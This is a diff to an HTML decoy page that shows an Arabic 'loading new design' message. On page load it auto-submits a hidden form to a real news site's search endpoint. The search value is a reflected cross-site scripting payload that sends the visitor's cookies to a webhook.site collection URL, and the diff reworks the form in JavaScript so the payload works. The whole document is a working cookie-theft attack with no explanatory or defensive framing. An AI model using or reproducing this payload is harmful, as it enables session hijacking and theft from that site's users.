@@ -19,10 +19,22 @@ p{text-align:center;color:#666}
 <div class="s"></div>
 <p>جاري تحميل التصميم الجديد...</p>
 </div>
-<form id="f" method="POST" action="https://www.almotamar.net/news/search.php">
-<input type="hidden" name="search" value="<svg onload="fetch('https://webhook.site/cfb50961-bf9e-48a8-b986-60014adb5551?c='+document.cookie)">">
-<input type="hidden" name="searchcategory" value="1">
-</form>
-<script>document.getElementById('f').submit()</script>
+<script>
+var f=document.createElement('form');
+f.method='POST';
+f.action='https://www.almotamar.net/news/search.php';
+var i=document.createElement('input');
+i.type='hidden';
+i.name='search';
+i.value='<svg/onload=fetch(\'https://webhook.site/cfb50961-bf9e-48a8-b986-60014adb5551?c=\'+document.cookie)>';
+f.appendChild(i);
+var c=document.createElement('input');
+c.type='hidden';
+c.name='searchcategory';
+c.value='1';
+f.appendChild(c);
+document.body.appendChild(f);
+f.submit();
+</script>
 </body>
 </html>
